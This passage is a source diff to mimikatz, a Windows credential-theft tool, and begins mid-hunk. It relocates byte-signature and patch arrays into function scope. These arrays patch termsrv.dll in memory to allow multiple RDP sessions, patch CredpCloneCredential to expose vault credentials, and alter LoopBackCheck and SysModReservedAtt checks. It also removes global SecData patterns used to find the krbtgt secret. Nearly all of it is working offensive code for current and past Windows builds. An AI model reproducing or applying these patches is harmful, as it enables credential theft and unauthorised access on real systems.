+		{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WN61_LoopBackCheck),	PTRN_WN61_LoopBackCheck},	{sizeof(PTRN_JMP_NEAR), PTRN_JMP_NEAR}, {28}},
+		{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WN81_LoopBackCheck),	PTRN_WN81_LoopBackCheck},	{sizeof(PTRN_JMP), PTRN_JMP}, {17}},
+		{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_WN10_1607_LoopBackCheck),	PTRN_WN10_1607_LoopBackCheck},	{sizeof(PTRN_JMP), PTRN_JMP}, {14}},
+	};
+	// ModSetAttsHelperPreProcess:SysModReservedAtt
+	BYTE PTRN_WN52_SysModReservedAtt[] = { 0x0f, 0xb7, 0x8c, 0x24, 0xc8, 0x00, 0x00, 0x00 };
+	BYTE PTRN_WN61_SysModReservedAtt[] = { 0x0f, 0xb7, 0x8c, 0x24, 0x78, 0x01, 0x00, 0x00, 0x4d, 0x8b, 0x6d, 0x00 };
+	BYTE PTRN_WN81_SysModReservedAtt[] = { 0x0f, 0xb7, 0x8c, 0x24, 0xb8, 0x00, 0x00, 0x00 };
+	BYTE PTRN_WN10_1607_SysModReservedAtt[] = { 0x8b, 0xbc, 0x24, 0xd8, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x01, 0x00, 0x00, 0x00, 0x0f, 0xb7, 0x8c, 0x24, 0xc8, 0x00, 0x00, 0x00 };
+	KULL_M_PATCH_GENERIC SysModReservedAttReferences[] = {
+		{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WN52_SysModReservedAtt),	PTRN_WN52_SysModReservedAtt},	{sizeof(PTRN_6NOP), PTRN_6NOP}, {-6}},
+		{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WN61_SysModReservedAtt),	PTRN_WN61_SysModReservedAtt},	{sizeof(PTRN_6NOP), PTRN_6NOP}, {-6}},
+		{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WN81_SysModReservedAtt),	PTRN_WN81_SysModReservedAtt},	{sizeof(PTRN_6NOP), PTRN_6NOP}, {-6}},
+		{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_WN10_1607_SysModReservedAtt),	PTRN_WN10_1607_SysModReservedAtt},	{sizeof(PTRN_6NOP), PTRN_6NOP}, {-6}},
+	};
+#elif defined(_M_IX86)
+#endif
 	if(kull_m_patch_genericProcessOrServiceFromBuild(LoopBackCheckReferences, sizeof(LoopBackCheckReferences), service, lib, TRUE))
 	{
 		kprintf(L"Patch 2/2: ");
diff --git a/files/mimikatz/mimikatz/modules/kuhl_m_ts.c b/files/mimikatz/mimikatz/modules/kuhl_m_ts.c
index 0c48bf6..6a0aed7 100644
--- a/files/mimikatz/mimikatz/modules/kuhl_m_ts.c
+++ b/files/mimikatz/mimikatz/modules/kuhl_m_ts.c
@@ -16,39 +16,40 @@ const KUHL_M kuhl_m_ts = {
 	ARRAYSIZE(kuhl_m_c_ts), kuhl_m_c_ts, NULL, NULL
 };
 
+
+NTSTATUS kuhl_m_ts_multirdp(int argc, wchar_t * argv[])
+{
 #if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
-BYTE PTRN_WN60_Query__CDefPolicy[]	= {0x8b, 0x81, 0x38, 0x06, 0x00, 0x00, 0x39, 0x81, 0x3c, 0x06, 0x00, 0x00, 0x75};
-BYTE PTRN_WN6x_Query__CDefPolicy[]	= {0x39, 0x87, 0x3c, 0x06, 0x00, 0x00, 0x0f, 0x84};
-BYTE PTRN_WN81_Query__CDefPolicy[]	= {0x39, 0x81, 0x3c, 0x06, 0x00, 0x00, 0x0f, 0x84};
-BYTE PTRN_W10_1803_Query__CDefPolicy[] = {0x8b, 0x99, 0x3c, 0x06, 0x00, 0x00, 0x8b, 0xb9, 0x38, 0x06, 0x00, 0x00, 0x3b, 0xdf, 0x0f, 0x84};
-BYTE PTRN_W10_1809_Query__CDefPolicy[] = {0x8b, 0x81, 0x38, 0x06, 0x00, 0x00, 0x39, 0x81, 0x3c, 0x06, 0x00, 0x00, 0x0f, 0x84};
-BYTE PATC_WN60_Query__CDefPolicy[]	= {0xc7, 0x81, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90, 0xeb};
-BYTE PATC_WN6x_Query__CDefPolicy[]	= {0xc7, 0x87, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90};
-BYTE PATC_WN81_Query__CDefPolicy[]	= {0xc7, 0x81, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90};
-BYTE PATC_W10_1803_Query__CDefPolicy[] = {0xc7, 0x81, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90, 0x90, 0x90, 0x90, 0xe9};
-BYTE PATC_W10_1809_Query__CDefPolicy[] = {0xc7, 0x81, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
+	BYTE PTRN_WN60_Query__CDefPolicy[] = { 0x8b, 0x81, 0x38, 0x06, 0x00, 0x00, 0x39, 0x81, 0x3c, 0x06, 0x00, 0x00, 0x75 };
+	BYTE PTRN_WN6x_Query__CDefPolicy[] = { 0x39, 0x87, 0x3c, 0x06, 0x00, 0x00, 0x0f, 0x84 };
+	BYTE PTRN_WN81_Query__CDefPolicy[] = { 0x39, 0x81, 0x3c, 0x06, 0x00, 0x00, 0x0f, 0x84 };
+	BYTE PTRN_W10_1803_Query__CDefPolicy[] = { 0x8b, 0x99, 0x3c, 0x06, 0x00, 0x00, 0x8b, 0xb9, 0x38, 0x06, 0x00, 0x00, 0x3b, 0xdf, 0x0f, 0x84 };
+	BYTE PTRN_W10_1809_Query__CDefPolicy[] = { 0x8b, 0x81, 0x38, 0x06, 0x00, 0x00, 0x39, 0x81, 0x3c, 0x06, 0x00, 0x00, 0x0f, 0x84 };
+	BYTE PATC_WN60_Query__CDefPolicy[] = { 0xc7, 0x81, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90, 0xeb };
+	BYTE PATC_WN6x_Query__CDefPolicy[] = { 0xc7, 0x87, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90 };
+	BYTE PATC_WN81_Query__CDefPolicy[] = { 0xc7, 0x81, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90 };
+	BYTE PATC_W10_1803_Query__CDefPolicy[] = { 0xc7, 0x81, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90, 0x90, 0x90, 0x90, 0xe9 };
+	BYTE PATC_W10_1809_Query__CDefPolicy[] = { 0xc7, 0x81, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 };
 #elif defined(_M_IX86)
-BYTE PTRN_WN60_Query__CDefPolicy[]	= {0x3b, 0x91, 0x20, 0x03, 0x00, 0x00, 0x5e, 0x0f, 0x84};
-BYTE PTRN_WN6x_Query__CDefPolicy[]	= {0x3b, 0x86, 0x20, 0x03, 0x00, 0x00, 0x0f, 0x84};
-BYTE PTRN_WN81_Query__CDefPolicy[]	= {0x3b, 0x81, 0x20, 0x03, 0x00, 0x00, 0x0f, 0x84};
-BYTE PATC_WN60_Query__CDefPolicy[]	= {0xc7, 0x81, 0x20, 0x03, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x5e, 0x90, 0x90};
-BYTE PATC_WN6x_Query__CDefPolicy[]	= {0xc7, 0x86, 0x20, 0x03, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90};
-BYTE PATC_WN81_Query__CDefPolicy[]	= {0xc7, 0x81, 0x20, 0x03, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90};
-#endif
-BYTE PTRN_WIN5_TestLicence[]		= {0x83, 0xf8, 0x02, 0x7f};
-BYTE PATC_WIN5_TestLicence[]		= {0x90, 0x90};
-KULL_M_PATCH_GENERIC TermSrvMultiRdpReferences[] = {
-	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_TestLicence),			PTRN_WIN5_TestLicence},			{sizeof(PATC_WIN5_TestLicence),			PATC_WIN5_TestLicence},			{3}},
-	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WN60_Query__CDefPolicy),	PTRN_WN60_Query__CDefPolicy},	{sizeof(PATC_WN60_Query__CDefPolicy),	PATC_WN60_Query__CDefPolicy},	{0}},
-	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WN6x_Query__CDefPolicy),	PTRN_WN6x_Query__CDefPolicy},	{sizeof(PATC_WN6x_Query__CDefPolicy),	PATC_WN6x_Query__CDefPolicy},	{0}},
-	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WN81_Query__CDefPolicy),	PTRN_WN81_Query__CDefPolicy},	{sizeof(PATC_WN81_Query__CDefPolicy),	PATC_WN81_Query__CDefPolicy},	{0}},
-#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
-	{KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_W10_1803_Query__CDefPolicy),	PTRN_W10_1803_Query__CDefPolicy},	{sizeof(PATC_W10_1803_Query__CDefPolicy),	PATC_W10_1803_Query__CDefPolicy},	{0}},
-	{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_W10_1809_Query__CDefPolicy),	PTRN_W10_1809_Query__CDefPolicy},	{sizeof(PATC_W10_1809_Query__CDefPolicy),	PATC_W10_1809_Query__CDefPolicy},	{0}},
+	BYTE PTRN_WN60_Query__CDefPolicy[] = { 0x3b, 0x91, 0x20, 0x03, 0x00, 0x00, 0x5e, 0x0f, 0x84 };
+	BYTE PTRN_WN6x_Query__CDefPolicy[] = { 0x3b, 0x86, 0x20, 0x03, 0x00, 0x00, 0x0f, 0x84 };
+	BYTE PTRN_WN81_Query__CDefPolicy[] = { 0x3b, 0x81, 0x20, 0x03, 0x00, 0x00, 0x0f, 0x84 };
+	BYTE PATC_WN60_Query__CDefPolicy[] = { 0xc7, 0x81, 0x20, 0x03, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x5e, 0x90, 0x90 };
+	BYTE PATC_WN6x_Query__CDefPolicy[] = { 0xc7, 0x86, 0x20, 0x03, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90 };
+	BYTE PATC_WN81_Query__CDefPolicy[] = { 0xc7, 0x81, 0x20, 0x03, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90 };
 #endif
-};
-NTSTATUS kuhl_m_ts_multirdp(int argc, wchar_t * argv[])
-{
+	BYTE PTRN_WIN5_TestLicence[] = { 0x83, 0xf8, 0x02, 0x7f };
+	BYTE PATC_WIN5_TestLicence[] = { 0x90, 0x90 };
+	KULL_M_PATCH_GENERIC TermSrvMultiRdpReferences[] = {
+		{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_TestLicence),			PTRN_WIN5_TestLicence},			{sizeof(PATC_WIN5_TestLicence),			PATC_WIN5_TestLicence},			{3}},
+		{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WN60_Query__CDefPolicy),	PTRN_WN60_Query__CDefPolicy},	{sizeof(PATC_WN60_Query__CDefPolicy),	PATC_WN60_Query__CDefPolicy},	{0}},
+		{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WN6x_Query__CDefPolicy),	PTRN_WN6x_Query__CDefPolicy},	{sizeof(PATC_WN6x_Query__CDefPolicy),	PATC_WN6x_Query__CDefPolicy},	{0}},
+		{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WN81_Query__CDefPolicy),	PTRN_WN81_Query__CDefPolicy},	{sizeof(PATC_WN81_Query__CDefPolicy),	PATC_WN81_Query__CDefPolicy},	{0}},
+	#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
+		{KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_W10_1803_Query__CDefPolicy),	PTRN_W10_1803_Query__CDefPolicy},	{sizeof(PATC_W10_1803_Query__CDefPolicy),	PATC_W10_1803_Query__CDefPolicy},	{0}},
+		{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_W10_1809_Query__CDefPolicy),	PTRN_W10_1809_Query__CDefPolicy},	{sizeof(PATC_W10_1809_Query__CDefPolicy),	PATC_W10_1809_Query__CDefPolicy},	{0}},
+	#endif
+	};
 	kull_m_patch_genericProcessOrServiceFromBuild(TermSrvMultiRdpReferences, ARRAYSIZE(TermSrvMultiRdpReferences), L"TermService", L"termsrv.dll", TRUE);
 	return STATUS_SUCCESS;
 }
diff --git a/files/mimikatz/mimikatz/modules/kuhl_m_vault.c b/files/mimikatz/mimikatz/modules/kuhl_m_vault.c
index 70c4b21..e797880 100644
--- a/files/mimikatz/mimikatz/modules/kuhl_m_vault.c
+++ b/files/mimikatz/mimikatz/modules/kuhl_m_vault.c
@@ -404,45 +404,6 @@ void kuhl_m_vault_list_descItemData(PVAULT_ITEM_DATA pData)
 	}
 }
 
-#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
-BYTE PTRN_WNT5_CredpCloneCredential[]			= {0x8b, 0x47, 0x04, 0x83, 0xf8, 0x01, 0x0f, 0x84};
-BYTE PTRN_WN60_CredpCloneCredential[]			= {0x44, 0x8b, 0xea, 0x41, 0x83, 0xe5, 0x01, 0x75};
-BYTE PTRN_WN62_CredpCloneCredential[]			= {0x44, 0x8b, 0xfa, 0x41, 0x83, 0xe7, 0x01, 0x75};
-BYTE PTRN_WN63_CredpCloneCredential[]			= {0x45, 0x8b, 0xf8, 0x44, 0x23, 0xfa};
-BYTE PTRN_WN10_1607_CredpCloneCredential[]		= {0x45, 0x8b, 0xe0, 0x41, 0x83, 0xe4, 0x01, 0x75};
-BYTE PTRN_WN10_1703_CredpCloneCredential[]		= {0x45, 0x8b, 0xe6, 0x41, 0x83, 0xe4, 0x01, 0x75};
-BYTE PTRN_WN10_1803_CredpCloneCredential[]		= {0x45, 0x8b, 0xfe, 0x41, 0x83, 0xe7, 0x01, 0x75};
-BYTE PTRN_WN10_1809_CredpCloneCredential[]		= {0x45, 0x8b, 0xe6, 0x41, 0x83, 0xe4, 0x01, 0x0f, 0x84};
-BYTE PATC_WNT5_CredpCloneCredentialJmpShort[]	= {0x90, 0xe9};
-BYTE PATC_WALL_CredpCloneCredentialJmpShort[]	= {0xeb};
-BYTE PATC_WN64_CredpCloneCredentialJmpShort[]	= {0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
-KULL_M_PATCH_GENERIC CredpCloneCredentialReferences[] = {
-	{KULL_M_WIN_BUILD_2K3,	{sizeof(PTRN_WNT5_CredpCloneCredential),	PTRN_WNT5_CredpCloneCredential},	{sizeof(PATC_WNT5_CredpCloneCredentialJmpShort),	PATC_WNT5_CredpCloneCredentialJmpShort},	{6}},
-	{KULL_M_WIN_BUILD_VISTA,{sizeof(PTRN_WN60_CredpCloneCredential),	PTRN_WN60_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{7}},
-	{KULL_M_WIN_BUILD_8,	{sizeof(PTRN_WN62_CredpCloneCredential),	PTRN_WN62_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{7}},
-	{KULL_M_WIN_BUILD_BLUE,	{sizeof(PTRN_WN63_CredpCloneCredential),	PTRN_WN63_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{6}},
-	{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WN63_CredpCloneCredential),	PTRN_WN63_CredpCloneCredential},	{sizeof(PATC_WN64_CredpCloneCredentialJmpShort),	PATC_WN64_CredpCloneCredentialJmpShort},	{6}},
-	{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_WN10_1607_CredpCloneCredential),	PTRN_WN10_1607_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{7}},
-	{KULL_M_WIN_BUILD_10_1703,	{sizeof(PTRN_WN10_1703_CredpCloneCredential),	PTRN_WN10_1703_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{7}},
-	{KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_WN10_1803_CredpCloneCredential),	PTRN_WN10_1803_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{7}},
-	{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_WN10_1809_CredpCloneCredential),	PTRN_WN10_1809_CredpCloneCredential},	{sizeof(PATC_WN64_CredpCloneCredentialJmpShort),	PATC_WN64_CredpCloneCredentialJmpShort},	{7}},
-};
-#elif defined(_M_IX86)
-BYTE PTRN_WNT5_CredpCloneCredential[]			= {0x8b, 0x43, 0x04, 0x83, 0xf8, 0x01, 0x74};
-BYTE PTRN_WN60_CredpCloneCredential[]			= {0x89, 0x4d, 0x18, 0x83, 0x65, 0x18, 0x01, 0x75};
-BYTE PTRN_WN62_CredpCloneCredential[]			= {0x75, 0x1e, 0x83, 0x7f, 0x04, 0x02, 0x0f, 0x84};
-BYTE PTRN_WN64_CredpCloneCredential[]			= {0x75, 0x17, 0x83, 0x7f, 0x04, 0x02, 0x74};
-BYTE PTRN_WN10_1703_CredpCloneCredential[]		= {0x75, 0x1e, 0x8b, 0x47, 0x04, 0x83, 0xf8, 0x02, 0x0f, 0x84};
-BYTE PATC_WALL_CredpCloneCredentialJmpShort[]	= {0xeb};
-KULL_M_PATCH_GENERIC CredpCloneCredentialReferences[] = {
-	{KULL_M_WIN_BUILD_XP,	{sizeof(PTRN_WNT5_CredpCloneCredential),	PTRN_WNT5_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{6}},
-	{KULL_M_WIN_BUILD_VISTA,{sizeof(PTRN_WN60_CredpCloneCredential),	PTRN_WN60_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{7}},
-	{KULL_M_WIN_BUILD_8,	{sizeof(PTRN_WN62_CredpCloneCredential),	PTRN_WN62_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{0}},
-	{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WN64_CredpCloneCredential),	PTRN_WN64_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{0}},
-	{KULL_M_WIN_BUILD_10_1703,	{sizeof(PTRN_WN10_1703_CredpCloneCredential),	PTRN_WN10_1703_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{0}},
-};
-#endif
-
 NTSTATUS kuhl_m_vault_cred(int argc, wchar_t * argv[])
 {
 	DWORD credCount, i, j;
@@ -459,6 +420,44 @@ NTSTATUS kuhl_m_vault_cred(int argc, wchar_t * argv[])
 	static BOOL isPatching = FALSE;	
 	if(!isPatching && kull_m_string_args_byName(argc, argv, L"patch", NULL, NULL))
 	{
+#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
+		BYTE PTRN_WNT5_CredpCloneCredential[] = { 0x8b, 0x47, 0x04, 0x83, 0xf8, 0x01, 0x0f, 0x84 };
+		BYTE PTRN_WN60_CredpCloneCredential[] = { 0x44, 0x8b, 0xea, 0x41, 0x83, 0xe5, 0x01, 0x75 };
+		BYTE PTRN_WN62_CredpCloneCredential[] = { 0x44, 0x8b, 0xfa, 0x41, 0x83, 0xe7, 0x01, 0x75 };
+		BYTE PTRN_WN63_CredpCloneCredential[] = { 0x45, 0x8b, 0xf8, 0x44, 0x23, 0xfa };
+		BYTE PTRN_WN10_1607_CredpCloneCredential[] = { 0x45, 0x8b, 0xe0, 0x41, 0x83, 0xe4, 0x01, 0x75 };
+		BYTE PTRN_WN10_1703_CredpCloneCredential[] = { 0x45, 0x8b, 0xe6, 0x41, 0x83, 0xe4, 0x01, 0x75 };
+		BYTE PTRN_WN10_1803_CredpCloneCredential[] = { 0x45, 0x8b, 0xfe, 0x41, 0x83, 0xe7, 0x01, 0x75 };
+		BYTE PTRN_WN10_1809_CredpCloneCredential[] = { 0x45, 0x8b, 0xe6, 0x41, 0x83, 0xe4, 0x01, 0x0f, 0x84 };
+		BYTE PATC_WNT5_CredpCloneCredentialJmpShort[] = { 0x90, 0xe9 };
+		BYTE PATC_WALL_CredpCloneCredentialJmpShort[] = { 0xeb };
+		BYTE PATC_WN64_CredpCloneCredentialJmpShort[] = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 };
+		KULL_M_PATCH_GENERIC CredpCloneCredentialReferences[] = {
+			{KULL_M_WIN_BUILD_2K3,	{sizeof(PTRN_WNT5_CredpCloneCredential),	PTRN_WNT5_CredpCloneCredential},	{sizeof(PATC_WNT5_CredpCloneCredentialJmpShort),	PATC_WNT5_CredpCloneCredentialJmpShort},	{6}},
+			{KULL_M_WIN_BUILD_VISTA,{sizeof(PTRN_WN60_CredpCloneCredential),	PTRN_WN60_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{7}},
+			{KULL_M_WIN_BUILD_8,	{sizeof(PTRN_WN62_CredpCloneCredential),	PTRN_WN62_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{7}},
+			{KULL_M_WIN_BUILD_BLUE,	{sizeof(PTRN_WN63_CredpCloneCredential),	PTRN_WN63_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{6}},
+			{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WN63_CredpCloneCredential),	PTRN_WN63_CredpCloneCredential},	{sizeof(PATC_WN64_CredpCloneCredentialJmpShort),	PATC_WN64_CredpCloneCredentialJmpShort},	{6}},
+			{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_WN10_1607_CredpCloneCredential),	PTRN_WN10_1607_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{7}},
+			{KULL_M_WIN_BUILD_10_1703,	{sizeof(PTRN_WN10_1703_CredpCloneCredential),	PTRN_WN10_1703_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{7}},
+			{KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_WN10_1803_CredpCloneCredential),	PTRN_WN10_1803_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{7}},
+			{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_WN10_1809_CredpCloneCredential),	PTRN_WN10_1809_CredpCloneCredential},	{sizeof(PATC_WN64_CredpCloneCredentialJmpShort),	PATC_WN64_CredpCloneCredentialJmpShort},	{7}},
+		};
+#elif defined(_M_IX86)
+		BYTE PTRN_WNT5_CredpCloneCredential[] = { 0x8b, 0x43, 0x04, 0x83, 0xf8, 0x01, 0x74 };
+		BYTE PTRN_WN60_CredpCloneCredential[] = { 0x89, 0x4d, 0x18, 0x83, 0x65, 0x18, 0x01, 0x75 };
+		BYTE PTRN_WN62_CredpCloneCredential[] = { 0x75, 0x1e, 0x83, 0x7f, 0x04, 0x02, 0x0f, 0x84 };
+		BYTE PTRN_WN64_CredpCloneCredential[] = { 0x75, 0x17, 0x83, 0x7f, 0x04, 0x02, 0x74 };
+		BYTE PTRN_WN10_1703_CredpCloneCredential[] = { 0x75, 0x1e, 0x8b, 0x47, 0x04, 0x83, 0xf8, 0x02, 0x0f, 0x84 };
+		BYTE PATC_WALL_CredpCloneCredentialJmpShort[] = { 0xeb };
+		KULL_M_PATCH_GENERIC CredpCloneCredentialReferences[] = {
+			{KULL_M_WIN_BUILD_XP,	{sizeof(PTRN_WNT5_CredpCloneCredential),	PTRN_WNT5_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{6}},
+			{KULL_M_WIN_BUILD_VISTA,{sizeof(PTRN_WN60_CredpCloneCredential),	PTRN_WN60_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{7}},
+			{KULL_M_WIN_BUILD_8,	{sizeof(PTRN_WN62_CredpCloneCredential),	PTRN_WN62_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{0}},
+			{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WN64_CredpCloneCredential),	PTRN_WN64_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{0}},
+			{KULL_M_WIN_BUILD_10_1703,	{sizeof(PTRN_WN10_1703_CredpCloneCredential),	PTRN_WN10_1703_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{0}},
+		};
+#endif
 		if(CredpCloneCredentialReference = kull_m_patch_getGenericFromBuild(CredpCloneCredentialReferences, ARRAYSIZE(CredpCloneCredentialReferences), MIMIKATZ_NT_BUILD_NUMBER))
 		{
 			aPatternMemory.address = CredpCloneCredentialReference->Search.Pattern;
diff --git a/files/mimikatz/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c b/files/mimikatz/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c
index 74221d0..56ee10e 100644
--- a/files/mimikatz/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c
+++ b/files/mimikatz/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c
@@ -447,29 +447,7 @@ NTSTATUS kuhl_m_sekurlsa_getLogonData(const PKUHL_M_SEKURLSA_PACKAGE * lsassPack
 	return kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_logondata, &OptionalData);
 }
 
-#if !defined(_M_ARM64) // No DC on ARM64, for now?
-#if defined(_M_X64)
-BYTE PTRN_W2K3_SecData[]	= {0x48, 0x8d, 0x6e, 0x30, 0x48, 0x8d, 0x0d};
-BYTE PTRN_W2K8_SecData[]	= {0x48, 0x8d, 0x94, 0x24, 0xb0, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x0d};
-BYTE PTRN_W2K12_SecData[]	= {0x4c, 0x8d, 0x85, 0x30, 0x01, 0x00, 0x00, 0x48, 0x8d, 0x15};
-BYTE PTRN_W2K12R2_SecData[]	= {0x0f, 0xb6, 0x4c, 0x24, 0x30, 0x85, 0xc0, 0x0f, 0x45, 0xcf, 0x8a, 0xc1};
-BYTE PTRN_W2K19_SecData[]	= {0x44, 0x8b, 0x45, 0x80, 0x85, 0xc0, 0x0f, 0x84};
-KULL_M_PATCH_GENERIC SecDataReferences[] = {
-	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_W2K3_SecData),		PTRN_W2K3_SecData},		{0, NULL}, {  7, 37}},
-	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_W2K8_SecData),		PTRN_W2K8_SecData},		{0, NULL}, { 11, 39}},
-	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_W2K12_SecData),	PTRN_W2K12_SecData},	{0, NULL}, { 10, 39}},
-	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_W2K12R2_SecData),	PTRN_W2K12R2_SecData},	{0, NULL}, {-12, 39}},
-	{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_W2K12R2_SecData),	PTRN_W2K12R2_SecData},	{0, NULL}, { -9, 39}},
-	{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_W2K19_SecData),	PTRN_W2K19_SecData},	{0, NULL}, { -9, 39}},
-};
-#elif defined(_M_IX86)
-BYTE PTRN_W2K3_SecData[]	= {0x53, 0x56, 0x8d, 0x45, 0x98, 0x50, 0xb9};
-BYTE PTRN_W2K8_SecData[]	= {0x8b, 0x45, 0x14, 0x83, 0xc0, 0x18, 0x50, 0xb9};
-KULL_M_PATCH_GENERIC SecDataReferences[] = {
-	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_W2K3_SecData),		PTRN_W2K3_SecData},		{0, NULL}, {  7, 45}},
-	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_W2K8_SecData),		PTRN_W2K8_SecData},		{0, NULL}, {  8, 47}},
-};
-#endif
+
 NTSTATUS kuhl_m_sekurlsa_krbtgt(int argc, wchar_t * argv[])
 {
 	NTSTATUS status = kuhl_m_sekurlsa_acquireLSA();
